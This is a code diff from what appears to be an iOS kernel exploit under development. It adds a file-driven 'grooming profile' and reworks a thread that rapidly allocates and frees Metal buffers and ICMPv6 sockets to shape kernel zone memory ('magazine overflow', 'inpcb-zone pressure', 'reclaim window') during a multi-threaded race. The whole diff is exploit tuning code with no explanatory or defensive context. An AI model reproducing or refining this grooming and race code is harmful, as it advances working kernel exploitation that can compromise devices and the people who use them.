@@ -573,6 +573,36 @@ static void *p017_thread_c(void *arg) {
 // ═══════════════════════════════════════════════════════════════
 static volatile int p017_d_go = 0;
 
+/* FIX19: grooming profile from Documents/p017_d_profile.txt
+   "<burst> <gap_us> <mode>": mode 0 = fix18 continuous,
+   1 = paced (burst -> usleep(gap_us) reclaim window -> sockets),
+   2 = interleaved halves. Defaults 32/0/0. */
+static int p017_d_burst = 32;
+static int p017_d_gap_us = 0;
+static int p017_d_mode = 0;
+
+static void p017_load_profile(void) {
+    NSString *docs = [NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    NSString *path = [docs stringByAppendingPathComponent:@"p017_d_profile.txt"];
+    NSString *txt = [NSString stringWithContentsOfFile:path
+        encoding:NSUTF8StringEncoding error:nil];
+    if (txt.length) {
+        NSArray *t = [txt componentsSeparatedByCharactersInSet:
+            [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+        int b = t.count > 0 ? [t[0] intValue] : 32;
+        int g = t.count > 1 ? [t[1] intValue] : 0;
+        int m = t.count > 2 ? [t[2] intValue] : 0;
+        if (b > 0 && b <= 64) p017_d_burst = b;
+        if (g >= 0 && g <= 20000) p017_d_gap_us = g;
+        if (m >= 0 && m <= 2) p017_d_mode = m;
+    }
+    p017_log(@"[fix19] groom profile burst=%d gap_us=%d mode=%d (%@)",
+             p017_d_burst, p017_d_gap_us, p017_d_mode,
+             p017_d_mode == 0 ? @"fix18-continuous" :
+             p017_d_mode == 1 ? @"paced-reclaim-window" : @"interleaved");
+}
+
 static void *p017_thread_d(void *arg) {
     (void)arg;
     p017_set_thread_policy_tag(P017_AFFINITY_TAG_B);  /* CPU_B — shares the magazine */
@@ -583,25 +613,30 @@ static void *p017_thread_d(void *arg) {
     int local_err = 0;
 
     while (!p017_stop && p017_d_go) {
-        /* (1) magazine overflow: 32 create → drop all 32 */
-        id<MTLBuffer> burst[32] = {0};
-        int made = 0;
-        for (int i = 0; i < 32; i++) {
-            uint32_t sid = 0;
-            burst[i] = p017_create_resource(&sid, 0);
-            if (burst[i]) made++;
+        /* (FIX19) profile-driven grooming cycle */
+        id<MTLBuffer> burst[64] = {0};
+        int rounds = (p017_d_mode == 2) ? 2 : 1;
+        for (int r = 0; r < rounds; r++) {
+            int n = (p017_d_mode == 2) ? (p017_d_burst / 2) : p017_d_burst;
+            for (int i = 0; i < n; i++) {
+                uint32_t sid = 0;
+                burst[i] = p017_create_resource(&sid, 0);
+            }
+            for (int i = 0; i < n; i++) {
+                if (burst[i]) p017_drop_resource(&burst[i]);
+            }
+            if (p017_d_mode == 1 && p017_d_gap_us > 0) {
+                usleep((useconds_t)p017_d_gap_us);   /* reclaim window */
+            }
+            int sfd[64];
+            int sfdn = 0;
+            int sn = (p017_d_mode == 2) ? (p017_d_burst / 2) : 32;
+            for (int i = 0; i < sn; i++) {
+                sfd[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+                if (sfd[i] >= 0) sfdn++;
+            }
+            for (int i = 0; i < sfdn; i++) close(sfd[i]);
         }
-        for (int i = 0; i < 32; i++) {
-            if (burst[i]) p017_drop_resource(&burst[i]);
-        }
-        /* (2) inpcb-zone pressure: 32 socket churn cycles */
-        int sfd[32];
-        int sfdn = 0;
-        for (int i = 0; i < 32; i++) {
-            sfd[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
-            if (sfd[i] >= 0) sfdn++;
-        }
-        for (int i = 0; i < sfdn; i++) close(sfd[i]);
         local_iter++;
         if (sfdn == 0) local_err++;
 
@@ -704,6 +739,7 @@ static void p017_race(void) {
     p017_stop = 0;
     p017_race_start = 0;
     p017_thread_a_port = MACH_PORT_NULL;
+    p017_load_profile();             /* FIX19: burst/gap/mode from Documents */
     p017_d_go = 1;                   /* FIX18: gc-pressure thread armed */
     p017_a_iters = 0;
     p017_b_iters = 0;
